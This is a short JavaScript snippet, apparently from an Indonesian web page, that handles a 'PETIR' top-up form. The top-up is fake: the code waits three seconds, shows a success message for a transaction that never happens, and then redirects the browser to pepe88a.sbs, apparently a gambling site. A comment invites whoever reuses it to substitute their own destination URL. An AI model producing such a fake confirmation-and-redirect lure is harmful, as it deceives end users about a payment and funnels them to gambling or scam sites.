document.getElementById('topup-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const topup = document.getElementById('topup').value;

    if (!username || !topup) {
        alert('Harap isi semua data dengan benar.');
        return;
    }

    // Show loader animation
    const loader = document.getElementById('loader');
    loader.style.display = 'flex';

    // Simulate top-up process and redirect
    setTimeout(() => {
        loader.style.display = 'none';
        alert(`Top-up PETIR untuk ${username} sebesar ${topup} PETIR!`);
        window.location.href = 'https://pepe88a.sbs'; // Ganti dengan URL tujuan Anda
    }, 3000);
});
